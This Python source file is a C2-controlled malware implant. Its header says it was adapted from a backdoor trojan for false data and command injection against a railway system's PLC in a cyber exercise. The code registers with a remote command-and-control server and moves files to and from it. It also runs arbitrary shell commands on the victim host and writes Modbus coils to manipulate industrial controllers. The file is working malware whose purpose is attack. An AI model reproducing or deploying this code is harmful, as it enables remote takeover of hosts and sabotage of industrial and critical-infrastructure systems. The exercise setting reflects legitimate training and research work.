#-----------------------------------------------------------------------------
# Name:        falsecmdinjector.py
#
# Purpose:     This modbus data/cmd injector malware is modified from the backdoor 
#              trojan program <backdoorTrojan.py> by adding the plc-ModBus communication 
#              module so the C2 system can use it to launch the false data/command 
#              injection attack to the XS2023 railway system remotely.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1.1
# Created:     2023/10/19
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
""" Program design: 
    We want to implement a remote false data injector for XS2023 which can be linked in our 
    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
    This program will be used in the testRun attack demo and verfication of the 
    cyber event : Cross Sword 2023
"""

import os
import time
import subprocess
from datetime import datetime
import ConfigLoader
import modbusTcpCom

import c2MwUtils
import c2Client

CONFIG_FILE_NAME = 'falseCmdInjectorCfg.txt'

print("Current working directory is : %s" % os.getcwd())
dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

# Init the config loader program.
gGonfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
iConfigLoader = ConfigLoader.ConfigLoader(gGonfigPath, mode='r')
if iConfigLoader is None:
    print("Error: The config file %s is not exist.Program exit!" %str(gGonfigPath))
    exit()
CONFIG_DICT = iConfigLoader.getJson()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class falseCmdInjector(object):
    """ Modbus false data / command injector."""
    def __init__(self) -> None:
        self.malwareID = CONFIG_DICT['OWN_ID']
        self.malownIP = CONFIG_DICT['OWN_IP']
        # Init the C2 connector
        c2Ipaddr = CONFIG_DICT['C2_IP']
        c2Port = int(CONFIG_DICT['C2_PORT'])
        c2RptInv = int(CONFIG_DICT['C2_RPT_INV'])
        c2HttpsFlg = CONFIG_DICT['C2_HTTPS'] if 'C2_HTTPS' in CONFIG_DICT else False
        self.c2Connector = c2Client.c2Client(self.malwareID, c2Ipaddr, 
                                             c2Port=c2Port, ownIP=self.malownIP, reportInt=c2RptInv,
                                             httpsFlg=c2HttpsFlg)
        # Resiger to C2
        self.taskList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'ExPerT': 0,
                'state' : c2MwUtils.TASK_R_FLG,
                'taskData': None
            }
        ]
        self.c2Connector.registerToC2(taskList=self.taskList)
        # Init the own data record obj:
        self.ownRcd = c2MwUtils.mwClientRcd(self.malwareID, self.malownIP, taskList=self.taskList)
        # Init the PLC connector 
        plcIP = CONFIG_DICT['PLC_IP']
        plcPort = int(CONFIG_DICT['PLC_PORT'])
        self.plcConnector = modbusTcpCom.modbusTcpClient(plcIP, tgtPort=plcPort)
        while not self.plcConnector.checkConn():
            print('try connect to the PLC')
            print(self.plcConnector.getCoilsBits(0, 4))
            time.sleep(0.5)
        self.c2Connector.start()
        self.terminate = False
        print("False command injector init finished.") 

    #-----------------------------------------------------------------------------
    def run(self):
        while not self.terminate:
            # Check whether got new incomming task
            task = self.c2Connector.getOneC2Task()
            # Sychronized the task record
            if task is not None: self.ownRcd.addNewTask(task)
            # Do tasks one by one
            for taskDict in self.ownRcd.getTaskList(taskState=c2MwUtils.TASK_A_FLG):
                idx = taskDict['taskID']
                resultStr = 'taskfinished'
                for _ in range(taskDict['repeat']):
                    if taskDict['taskType'] == 'upload' or taskDict['taskType'] == 'download':
                        time.sleep(int(taskDict['ExPerT']))
                        uploadFlg = taskDict['taskType'] == 'upload'
                        self.c2Connector.transferFiles(taskDict['taskData'], uploadFlg=uploadFlg)
                        resultStr = 'File transfered'
                    elif taskDict['taskType'] == c2MwUtils.CMD_FLG:
                        cmd = str(taskDict['taskData'][0])
                        print("Run cmd : %s " % str(cmd))
                        resultStr = self.runCmd('detail', cmd)
                    elif taskDict['taskType'] == 'modbus':
                        resultStr = self.handlerModbusReq(taskDict['taskData'])
                    # Add the execution result in the report queue.
                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
                    reportDict ={
                        'taskID'    : idx,
                        'state'     : c2Client.TASK_F_FLG,
                        'Time'      : datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'taskData'  : str(resultStr)
                    }
                    self.c2Connector.addNewReport(reportDict)
                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
                    time.sleep(0.1)

    #-----------------------------------------------------------------------------
    def handlerModbusReq(self, reqStr):
        """ Parse the modub request string and call the modbus API to communicate 
            with the PLC based on the 
            Args:
                reqStr (str): modbus cmd string example: read;reg;0;4
            Returns:
                str: modbus feed back data.
        """
        resultStr = 'taskfinished'
        data = str(reqStr).strip()
        vals = data.split(';')
        act = vals[0]
        itemType = vals[1]
        addr = int(vals[2])
        if act == 'read':
            offset = int(vals[3])
            if itemType == 'reg':
                print("Info: handlerModbusReq()> Read holding register.")
                result = self.plcConnector.getHoldingRegs(addr, offset)
                resultStr = str(result)
            else:
                print("Info: handlerModbusReq()> Read coils.")
                result = self.plcConnector.getCoilsBits(addr, offset)
                resultStr = str(result)
        elif act == 'write':
            print("Info: handlerModbusReq()> Write coils.")
            coilVal = int(vals[3])
            result = self.plcConnector.setCoilsBit(addr, coilVal==1)
            resultStr = str(result)
        return resultStr

    #-----------------------------------------------------------------------------
    def runCmd(self, returnType, cmdStr):
        """ Run a command and collect the result on the victim host.
        Args:
            returnType (str): if == 'detail' return the command execution result, 
                        else return execution success/fail
            cmdStr (str):  command string.
        """
        if returnType and cmdStr:
            try:
                result = subprocess.check_output(str(cmdStr), 
                                                stderr=subprocess.STDOUT, 
                                                shell=True)
                print(result)
                return result if returnType == 'detail' else 'success'
            except Exception as err:
                print("Rum cmd error: %s" %str(err))
                return str(err) if returnType == 'detail' else 'fail'
        else:
            return 'error'
    
    #-----------------------------------------------------------------------------
    def stop(self):
        self.c2Connector.stop()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    client = falseCmdInjector()
    time.sleep(1)
    client.run()
    client.stop()

if __name__ == '__main__':
    main()
